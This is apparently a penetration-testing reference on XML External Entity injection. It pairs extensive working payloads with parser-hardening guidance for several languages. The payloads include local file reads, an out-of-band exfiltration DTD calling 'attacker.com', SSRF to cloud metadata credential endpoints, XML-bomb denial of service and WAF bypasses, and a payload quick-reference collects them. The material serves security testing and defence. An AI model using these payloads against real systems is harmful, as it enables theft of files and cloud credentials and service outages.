# XXE (XML External Entity) Security Reference

**Purpose:** Comprehensive reference for testing XML External Entity injection — classic, blind/OOB, error-based, XInclude, SVG/DOCX/SAML/SOAP, SSRF chaining, DoS, parser-specific bypasses, and prevention per language.

**Schema version:** 1  
**Skill version:** paladin-probe@v3

---

## Table of Contents

1. [Attack Surface](#1-attack-surface)
2. [Classic In-Band XXE](#2-classic-in-band-xxe)
3. [Blind XXE (OOB)](#3-blind-xxe-oob)
4. [Error-Based XXE](#4-error-based-xxe)
5. [XInclude XXE](#5-xinclude-xxe)
6. [SVG / DOCX / SAML / SOAP XXE](#6-svg--docx--saml--soap-xxe)
7. [XXE to SSRF](#7-xxe-to-ssrf)
8. [Denial of Service](#8-denial-of-service)
9. [Parser-Specific Bypasses](#9-parser-specific-bypasses)
10. [WAF & Encoding Bypasses](#10-waf--encoding-bypasses)
11. [Prevention by Language](#11-prevention-by-language)
12. [Real-World CVEs](#12-real-world-cves)
13. [Tooling](#13-tooling)
14. [Testing Methodology](#14-testing-methodology)
15. [Payload Quick Reference](#15-payload-quick-reference)
16. [YAML Fingerprint Tables](#16-yaml-fingerprint-tables)

---

## 1. Attack Surface

### Where XXE Hides

| Surface | Example | Risk |
|---------|---------|------|
| API endpoints | `Content-Type: application/xml` handler | Classic XXE |
| File uploads | SVG avatars, DOCX resumes, XLSX imports | Stored processed XML |
| SAML SSO | SAML Response assertion parsing | Pre-auth XXE |
| SOAP services | SOAP envelope endpoints | Legacy middleware |
| Document conversion | PDF generators, e-signature renderers | SVG/Office XML |
| RSS/OPML import | Feed parser | External entity fetch |
| XMP metadata | Image EXIF/XMP extraction via XML parser | Embedded XML |
| JSON-to-XML transform | API gateway converts JSON to XML internally | Content-type pivot |

### Detection Surface Probe

```bash
# Find XML endpoints
curl -s -D- https://target.com/api -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><test>1</test></root>'

# Test DOCTYPE acceptance
curl -s https://target.com/api -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>'

# If response includes hostname -> classic XXE confirmed
```

---

## 2. Classic In-Band XXE

### Linux File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Windows File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<root>&xxe;</root>
```

### PHP Wrapper Read

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### Port / Service Probing

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/internal">
]>
<root>&xxe;</root>
```

### Detection Signals

- File content appears in response field
- Stack trace mentioning file path (`SAXParseException`, `XmlException`)
- `file:///dev/random` hangs the request (timing primitive)
- Response time varies — entity fetching remote resource

---

## 3. Blind XXE (OOB)

### OOB Detection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-BURP-COLLABORATOR/oob">
  %xxe;
]>
<root>1</root>
```

### Full OOB Exfiltration (External DTD)

**payload.xml:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
  %remote;
  %send;
]>
<root>1</root>
```

**xxe.dtd (hosted on attacker.com):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

### FTP OOB (Windows)

```xml
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
  %remote;
  %send;
]>
```
With DTD using `ftp://` scheme for environments where HTTP egress is blocked.

### Detection Signals

- DNS/HTTP callback received at Collaborator
- Delayed response (entity fetching remote resource)
- Different response for internal vs external DOCTYPE

---

## 4. Error-Based XXE

### Local DTD Reuse

When egress is firewalled, use local DTD files on the target system:

```xml
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd">
  %local;
]>
<root>1</root>
```

### Error Oracle

Force a parse error that includes file content by referencing a non-existent path derived from file data:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser error message will leak the file path.

### Known Local DTDs

| OS / Distro | Path |
|-------------|------|
| Linux (Debian/Ubuntu) | `/usr/share/xml/...` |
| Linux (RHEL/CentOS) | `/usr/share/xml/...` |
| macOS | `/usr/share/sgml/...` |
| Windows | `.NET Framework` bundled DTDs |
| JDK | `zip:` `file:///usr/lib/jvm/...` |

---

## 5. XInclude XXE

### Bypasses DOCTYPE Stripping

When upstream strips `<!DOCTYPE>` but the parser has XInclude enabled:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### XInclude SSRF

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</root>
```

### Detection Signals

- Application strips `<!DOCTYPE>` but still echoes file content
- Parser is configured with `setXIncludeAware(true)` without disabling external resolution

---

## 6. SVG / DOCX / SAML / SOAP XXE

### SVG Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### SVG xlink:href Variant

```xml
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" width="600" height="400">
  <image xlink:href="file:///etc/passwd" width="600" height="400"/>
</svg>
```

### DOCX Repack

```bash
# 1. Unzip target.docx
unzip target.docx -d out/
# 2. Edit out/word/document.xml — add DOCTYPE and entity reference
# 3. Repack
cd out && zip -r ../malicious.docx .
```

DOCX body payload (`word/document.xml`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document ...>
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
```

### SAML Response XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <samlp:Issuer>&xxe;</samlp:Issuer>
</samlp:Response>
```

SAML XXE fires before signature validation — pre-auth file read.

### SOAP Envelope

```xml
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><user>&xxe;</user></soap:Body>
</soap:Envelope>
```

### JSON-to-XML Content-Type Pivot

```bash
# Send JSON body but with XML Content-Type
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

---

## 7. XXE to SSRF

### AWS Metadata

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

### GCP Metadata

```xml
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
```

### Azure Metadata

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">
```

### Internal Port Scan via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY port1 SYSTEM "http://127.0.0.1:8080/">
  <!ENTITY port2 SYSTEM "http://127.0.0.1:8081/">
  <!ENTITY port3 SYSTEM "http://127.0.0.1:8082/">
]>
<root>&port1;&port2;&port3;</root>
```

Observe timing differences to infer open ports (timeout vs immediate error).

---

## 8. Denial of Service

### Billion Laughs (XML Bomb)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  ... (repeat to lol9)
]>
<root>&lol9;</root>
```

Entity expansion grows exponentially (~3 GB at lol9).

### Quadratic Blowup

```xml
<!ENTITY a "aaaaaaaaaaaaaaaa...aaaaaaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!-- repeats -->
```

O(n²) memory growth instead of exponential — harder to detect.

### Detecting DoS Protection

```bash
# Send Billion Laughs payload
# If request times out or returns 413/400 -> parser has protections
# If returns 200 (slow) -> vulnerable
```

---

## 9. Parser-Specific Bypasses

### Java — DocumentBuilderFactory

Default is vulnerable. Defenses must be explicit:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
```

Bypass: If XInclude not disabled, `xi:include` still works even with DOCTYPE blocked.

### Python — lxml

```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
```

CVE-2024-6508: `resolve_entities=False` alone is insufficient — `no_network=True` and `load_dtd=False` also required.

### Python — xml.etree

Default is **vulnerable** in Python <3.7. Use `defusedxml` instead.

```python
from defusedxml import ElementTree as ET
```

### PHP — libxml

PHP 8.0+ defaults to safe. Earlier versions need:

```php
libxml_disable_entity_loader(true);
```

### .NET

| Version | Default | Safe By Default |
|---------|---------|-----------------|
| <.NET 4.0 | XmlDocument unsafe | No |
| .NET 4.0–4.5.2 | XmlDocument unsafe | No |
| .NET ≥4.5.2 | XmlDocument safe | Yes |
| XmlReader (all) | Safe | Yes |

### XMLParser XInclude Enablement

Many parsers have XInclude as a separate flag from entity resolution:
- Java: `setXIncludeAware(true)` — must explicitly set to false
- libxml2: `XML_PARSE_XINCLUDE` — not set by default in 2.9+

---

## 10. WAF & Encoding Bypasses

### UTF-16 / UTF-7 Encoding

```bash
# Convert to UTF-16LE with BOM
iconv -f UTF-8 -t UTF-16LE payload.xml | curl -X POST \
  -H "Content-Type: application/xml; charset=utf-16" \
  --data-binary @- https://target.com/api
```

### CDATA Wrapping

When entities are stripped in output, wrap in CDATA:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>
```

### Parameter Entity Over General Entity

When general entities are blocked but parameter entities allowed:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %file;
]>
<root>1</root>
```

### DOCTYPE Blocklist Evasion

When regex blocks `<!DOCTYPE` but not `<!doctype`:

```xml
<?xml version="1.0"?>
<!doctype foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

---

## 11. Prevention by Language

### Minimal Hardening Rules

1. Disable DOCTYPE entirely if not needed
2. Disable external entities (general + parameter)
3. Disable external DTD loading
4. Disable XInclude
5. Limit entity expansion (Billion Laughs protection)
6. Prefer JSON over XML for new APIs

### Java

```java
// Disable DOCTYPE (primary defense)
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// If DOCTYPE required:
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
```

### Python

```python
# Use defusedxml — safe defaults
from defusedxml import ElementTree as ET
from defusedxml import sax, minidom, pulldom

# If using lxml directly:
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False,
    dtd_validation=False
)
```

### PHP

```php
// PHP 8.0+ safe by default
// PHP <8.0:
libxml_disable_entity_loader(true);
```

### .NET

```csharp
// .NET 4.5.2+ XmlDocument is safe by default
// For older versions:
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;  // Disable external entity resolution
```

### Node.js

```javascript
// libxmljs2
const libxml = require('libxmljs2');
const xml = libxml.parseXmlString(input, {
  noblanks: true,
  noent: false,      // Don't expand entities
  nocdata: false,
  nonet: true,       // No network access
  dtdload: false,    // No DTD loading
  dtdvalid: false,
  dtdattr: false
});
```

---

## 12. Real-World CVEs

| CVE | Year | Product | Impact |
|-----|------|---------|--------|
| CVE-2025-66516 | 2025 | Apache Tika PDF/XFA | CVSS 10.0 — RCE via XXE |
| CVE-2024-34102 | 2024 | Adobe Commerce (CosmicSting) | CVSS 9.8 — unauthenticated XXE → RCE |
| CVE-2024-30043 | 2024 | Microsoft SharePoint | File read + SSRF (Farm Service account) |
| CVE-2024-22024 | 2024 | Ivanti Connect Secure SAML | CVSS 9.1 — unauthenticated SAML XXE |
| CVE-2024-52596 | 2024 | SimpleSAMLphp xml-common | SAML XXE |
| CVE-2024-6508 | 2024 | python-lxml | Entity resolver bypass with all 3 flags |
| CVE-2024-45409 | 2024 | ruby-saml | SAML signature bypass + XXE |
| CVE-2023-42344 | 2023 | OpenCMS 9–10.5 | Unauthenticated XXE → RCE |
| CVE-2023-29007 | 2023 | (various) | XXE in document processing |

---

## 13. Tooling

| Tool | Purpose |
|------|---------|
| Burp Suite | Collaborator for OOB; scanner detects XXE |
| XXEinjector | Automated blind XXE (rakeinjector) |
| OWASP ZAP | Active scanner includes XXE rules |
| interactsh | Free OOB callback server |
| DOMPurify | Client-side SVG sanitization |

---

## 14. Testing Methodology

### Phase 1: Discovery

1. Find every endpoint that accepts XML (Content-Type, SOAP, SAML, file upload)
2. Send simple DOCTYPE probe — check for differential responses
3. Try Content-Type pivot (JSON endpoint with XML content-type)
4. Upload SVG to image/profile endpoints
5. Upload repacked DOCX to document processors

### Phase 2: Classic Exploitation

1. File read probe (`/etc/passwd`, `/windows/win.ini`)
2. PHP wrapper probe if PHP detected
3. Port scan via timing (localhost internal ports)

### Phase 3: Blind

1. OOB detection with Collaborator
2. Set up external DTD for data exfiltration
3. Test FTP/HTTP for environments with restricted egress

### Phase 4: Advanced Bypass

1. Test XInclude when DOCTYPE stripped
2. Test UTF-16 encoding for WAF bypass
3. Try parameter entities when general entities blocked
4. Test local DTD reuse when egress blocked

---

## 15. Payload Quick Reference

```xml
<!-- Existence probe -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>

<!-- Linux file read -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

<!-- Windows file read -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><root>&xxe;</root>

<!-- PHP wrapper -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>

<!-- OOB detection -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % oob SYSTEM "http://COLLABORATOR/oob">%oob;]><root>1</root>

<!-- XInclude bypass -->
<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>

<!-- SVG upload -->
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="..."><text x="0" y="20">&xxe;</text></svg>

<!-- SSRF to AWS -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>

<!-- Billion Laughs -->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>

<!-- UTF-16 bypass (run via curl --data-binary) -->
iconv -f UTF-8 -t UTF-16LE payload.xml

<!-- Content-Type pivot (JSON endpoint) -->
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' https://target.com/api
```

---

## 16. YAML Fingerprint Tables

```yaml
xxe_classic_file_read:
  probe: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
  detection: response contains "root:x:" or file content

xxe_outbound_detected:
  probe: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % oob SYSTEM "http://COLLAB/oob">%oob;]><root>1</root>'
  detection: DNS/HTTP callback received at Collaborator

xxe_error_based:
  probe: 'forced parse error referencing file content'
  detection: error message includes file content

xxe_xinclude:
  probe: '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>'
  detection: response contains file content despite DOCTYPE stripped upstream

xxe_svg_upload:
  probe: 'upload SVG with DOCTYPE pointing at file:///etc/hostname'
  detection: rendered SVG text or alt-text contains hostname

xxe_content_type_pivot:
  probe: 'send XML to JSON-only endpoint via Content-Type: application/xml'
  detection: endpoint accepts and processes XML content

xxe_billion_laughs:
  probe: 'entity expansion payload to lol9'
  detection: 413/400 if protected; timeout/500 if vulnerable

xxe_utf16_bypass:
  probe: 'UTF-16LE encoded XXE payload with charset header'
  detection: WAF allows, parser processes

xxe_local_dtd_reuse:
  probe: 'parameter entity referencing known local DTD path'
  detection: error-based or OOB leak of file content
```
